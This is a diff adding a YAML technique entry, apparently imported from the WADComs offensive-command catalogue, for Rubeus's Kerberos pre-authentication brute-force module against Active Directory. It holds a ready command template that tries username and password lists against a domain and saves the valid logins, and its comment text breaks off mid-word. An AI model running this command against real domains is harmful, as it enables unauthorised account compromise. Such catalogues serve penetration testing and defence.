@@ -1,0 +1,29 @@
+id: wadcoms/rubeus-brute
+type: technique
+platform: active-directory
+name: Rubeus Brute
+phases:
+- discovery
+capabilities:
+- discovery
+privilege_required: none
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- no credentials required
+commands:
+- template: Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt
+  comment: 'Rubeus'' `brute` module bruteforces and enumerates valid Active Directory accounts through
+    Kerberos Pre-Authentication. The following command will attempt to brute force valid username and
+    passwords logins given a list of usernames and a list of passwords. Command Reference: Domai'
+references:
+- https://github.com/GhostPack/Rubeus
+- https://github.com/GhostPack/Rubeus#brute
+tags:
+- active-directory
+- wadcoms
+- kerberos
